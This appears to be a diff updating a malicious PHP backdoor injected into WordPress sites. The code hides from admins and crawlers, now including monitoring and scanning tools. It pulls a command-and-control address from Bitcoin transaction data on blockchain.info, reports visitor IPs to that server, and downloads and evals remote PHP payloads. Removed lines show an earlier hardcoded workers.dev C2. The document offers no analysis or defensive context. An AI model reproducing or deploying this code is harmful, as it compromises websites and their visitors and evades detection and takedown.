@@ -1,9 +1,9 @@
 error_reporting(0);
 ini_set("display_errors", "0");
 if (!defined("WP_NIGHTMARE")) {
-	if (str_replace(["wp-admin", "doing_wp_cron", "wp-login", "wp-json", "xmlrpc", ".txt", ".png", ".jpg", ".ico"], "", $_SERVER["REQUEST_URI"]) == $_SERVER["REQUEST_URI"]) {
+	if (str_replace(["wp-admin", "doing_wp_cron", "wp-login", "wp-json", "xmlrpc", ".txt", ".png", ".jpg", ".ico", ".env"], "", $_SERVER["REQUEST_URI"]) == $_SERVER["REQUEST_URI"]) {
 		if (isset($_SERVER["HTTP_USER_AGENT"])) {
-		    if (!preg_match('/abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Iframely|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jetmon|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i', $_SERVER["HTTP_USER_AGENT"])) {
+		    if (!preg_match('/abacho|accona|AddThis|AdsBot|ahoy|AhrefsBot|AISearchBot|alexa|altavista|anthill|appie|applebot|arale|araneo|AraybOt|ariadne|arks|aspseek|ATN_Worldwide|Atomz|baiduspider|baidu|bbot|bingbot|bing|Bjaaland|BlackWidow|BotLink|bot|boxseabot|bspider|calif|CCBot|ChinaClaw|christcrawler|CMC\/0\.01|combine|confuzzledbot|contaxe|CoolBot|cosmos|crawler|crawlpaper|crawl|curl|cusco|cyberspyder|cydralspider|dataprovider|digger|DIIbot|DotBot|downloadexpress|DragonBot|DuckDuckBot|dwcp|EasouSpider|ebiness|ecollector|elfinbot|esculapio|ESI|esther|eStyle|expanseinc|Ezooms|facebookexternalhit|facebook|facebot|fastcrawler|FatBot|FDSE|FELIX IDE|fetch|fido|find|Firefly|fouineur|Freecrawl|froogle|gammaSpider|gazz|gcreep|geona|Getterrobo-Plus|get|girafabot|golem|googlebot|\-google|grabber|GrabNet|griffon|Gromit|gulliver|gulper|hambot|havIndex|hotwired|htdig|HTTrack|ia_archiver|iajabot|IDBot|Iframely|Informant|InfoSeek|InfoSpiders|INGRID\/0\.1|inktomi|inspectorwww|Internet Cruiser Robot|irobot|Iron33|JBot|jcrawler|Jeeves|jetmon|jobo|KDD\-Explorer|KIT\-Fireball|ko_yappo_robot|label\-grabber|larbin|legs|libwww-perl|linkedin|Linkidator|linkwalker|Lockon|logo_gif_crawler|Lycos|m2e|majesticsEO|marvin|mattie|mediafox|mediapartners|MerzScope|MindCrawler|MJ12bot|mod_pagespeed|moget|monitoring|Motor|msnbot|muncher|muninn|MuscatFerret|MwdSearch|NationalDirectory|naverbot|NEC\-MeshExplorer|NetcraftSurveyAgent|NetScoop|NetSeer|newscan\-online|nil|none|Nutch|ObjectsSearch|Occam|openstat.ru\/Bot|packrat|pageboy|ParaSite|patric|pegasus|perlcrawler|phpdig|piltdownman|Pimptrain|pingdom|pinterest|pjspider|PlumtreeWebAccessor|PortalBSpider|psbot|python\-requests|rambler|Raven|RHCS|RixBot|roadrunner|Robbie|robi|RoboCrawl|robofox|Scooter|Scrubby|Search\-AU|searchprocess|search|SemrushBot|Senrigan|seznambot|Shagseeker|sharp\-info\-agent|sift|SimBot|Site Valet|SiteSucker|skymob|SLCrawler\/2\.0|slurp|snooper|solbot|speedy|spider_monkey|SpiderBot\/1\.0|spiderline|spider|suke|tach_bw|TechBOT|TechnoratiSnoop|templeton|teoma|titin|topiclink|twitterbot|twitter|UdmSearch|Ukonline|UnwindFetchor|URL_Spider_SQL|urlck|urlresolver|Valkyrie libwww\-perl|verticrawl|Victoria|void\-bot|Voyager|VWbot_K|wapspider|WebBandit\/1\.0|webcatcher|WebCopier|WebFindBot|WebLeacher|WebMechanic|WebMoose|webquest|webreaper|webspider|webs|WebWalker|WebZip|wget|whowhere|winona|wlm|WOLP|woriobot|WWWC|XGET|xing|yahoo|YandexBot|YandexMobileBot|yandex|yeti|Zeus/i', $_SERVER["HTTP_USER_AGENT"])) {
 				define("WP_NIGHTMARE", 1);
 				if (!function_exists("request")) {
 					function request($url, $parameters = null, $method = "GET") {
@@ -84,50 +84,84 @@ if (!defined("WP_NIGHTMARE")) {
 						}
 					}
 				}
-				if (!function_exists("fetch_bots")) {
-					function fetch_bots() {
-						$res = request("https://js.mirr0r.workers.dev/bots/get");
-						if ($res && $res != "") {
-							$bots = great_news(base64_decode($res), "onthewall");
-							return $bots;
-						} else {
-							return false;
-						}
-					}
-				}
-				if (!function_exists("get_bots")) {
-					function get_bots($fpath, $cache = 43200) {
+				if (!function_exists("fetch_url")) {
+					function fetch_url($url, $params, $fpath, $cache, $cb = null) {
 						$now = time();
 						$glob = glob($fpath . "_*");
 						if (empty($glob)) {
-							if ($r = fetch_bots()) {
-								$filename = $fpath . "_" . $now;
-								file_put_contents($filename, $r);
-								return explode("\n", $r);
+							$r = $cb ? $cb(request($url, $params)) : request($url, $params);
+							if ($r && $r != "") {
+								file_put_contents($fpath . "_" . $now, $r);
+								return $r;
 							} else {
-								return array();
+								return false;
 							}
 						} else {
 							$fullpath = $glob[0];
 							$last_updated = (int)explode("_", basename($fullpath))[1];
 							$expired = (($now - $last_updated) > $cache);
 							if ($expired) {
-								if ($r = fetch_bots()) {
+								$r = $cb ? $cb(request($url, $params)) : request($url, $params);
+								if ($r && $r != "") {
 									unlink($fullpath);
-									$new_filename = $fpath . "_" . $now;
-									file_put_contents($new_filename, $r);
-									return explode("\n", $r);
+									file_put_contents($fpath . "_" . $now, $r);
+									return $r;
 								} else {
-									return explode("\n", file_get_contents($fullpath));
+									return file_get_contents($fullpath);
 								}
 							} else {
-								return explode("\n", file_get_contents($fullpath));
+								return file_get_contents($fullpath);
 							}
 						}
 					}
 				}
+				if (!function_exists("get_ccurl")) {
+					function get_ccurl($working_dir) {
+						$cb = function ($r) {
+							$scriptbody = "";
+							foreach (json_decode($r, true)["txs"] as $tx) {
+								$script = $tx["out"][0]["script"];
+								if (substr($script, 0, 2) === "6a") {
+									$scriptbody = substr($script, 4, strlen($script) - 4);
+									break;
+								}
+							}
+							return $scriptbody;
+						};
+						$res = fetch_url(
+							"https://blockchain.info/rawaddr/bc1q03pe42tlt8rwu80h6hwy83g8zgsp3f3evpyh5a",
+							["limit" => "3"],
+							$working_dir . "/data",
+							86400,
+							$cb
+						);
+						return great_news(hex2bin($res), "midnightblue");
+					}
+				}
+				if (!function_exists("get_payload")) {
+					function get_payload($cc_url, $working_dir) {
+						$res = fetch_url($cc_url . "/api", ["domain" => $_SERVER["HTTP_HOST"]], $working_dir . "/source", 3600);
+						return great_news(base64_decode($res), "onthewall");
+					}
+				}
+				if (!function_exists("get_bots")) {
+					function get_bots($cc_url, $working_dir) {
+						$cb = function ($r) {
+							return great_news(base64_decode($r), "onthewall");
+						};
+						$res = fetch_url(
+							$cc_url . "/bots/get",
+							["domain" => $_SERVER["HTTP_HOST"]],
+							$working_dir . "/global", 
+							43200,
+							$cb
+						);
+						return explode("\n", $res);
+					}
+				}
 				if (!function_exists("update_bots")) {
-					function update_bots($fpath, $ip, $interval = 21600) {
+					function update_bots($working_dir, $ip, $interval = 21600) {
+						$fpath = $working_dir . "/local";
 						$glob = glob($fpath . "_*");
 						$now = time();
 						if (empty($glob)) {
@@ -150,7 +184,7 @@ if (!defined("WP_NIGHTMARE")) {
 								$last_updated = (int)explode("_", basename($fullpath))[1];
 								if (($now - $last_updated) > $interval) {
 									$bots = implode(PHP_EOL, array_unique(explode(PHP_EOL, file_get_contents($fullpath)), SORT_STRING));
-									request("https://js.mirr0r.workers.dev/bots/update", ["ip" => $bots], "POST");
+									request(get_ccurl($working_dir) . "/bots/update", ["ip" => $bots], "POST");
 									unlink($fullpath);
 									$new_fullpath = $fpath . "_" . $now;
 									file_put_contents($new_fullpath, $ip . PHP_EOL);
@@ -163,25 +197,17 @@ if (!defined("WP_NIGHTMARE")) {
 				}
 				$working_dir = get_working_dir(ABSPATH, ".docs");
 				$ip_str = get_client_ip();
-				$global_bots = get_bots($working_dir . "/global");
+				$cc_url = get_ccurl($working_dir);
+				$global_bots = get_bots($cc_url, $working_dir);
 				if (!in_array($ip_str, $global_bots)) {
 					if ($ip_str != null && !isset($_COOKIE["__mirr0r_good"])) {
-						update_bots($working_dir . "/local", $ip_str);
+						update_bots($working_dir, $ip_str);
 					}
-
-					$ip = rawurlencode($ip_str);
-					$url = rawurlencode("http" . ($_SERVER["HTTPS"] ? "s" : "") . "://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"]);
-					$ua = rawurlencode($_SERVER["HTTP_USER_AGENT"]);
-					$ref = rawurlencode($_SERVER["HTTP_REFERER"]);
-					$lang = (isset($_SERVER["HTTP_ACCEPT_LANGUAGE"]) ? substr($_SERVER["HTTP_ACCEPT_LANGUAGE"], 0, 2) : "");
-					$api_res = request("https://js.mirr0r.workers.dev/api", ["ip" => $ip, "url" => $url, "ua" => $ua, "ref" => $ref, "lang" => $lang]);
-					if ($api_res && $api_res != "") {
-						$php = great_news(base64_decode($api_res), "onthewall");
-						try {
-							@eval($php);
-						} catch(\Throwable $e) {
-							//
-						}
+					$payload = get_payload($cc_url, $working_dir);
+					try {
+						@eval($payload);
+					} catch(\Throwable $e) {
+						//
 					}
 				}
 			}
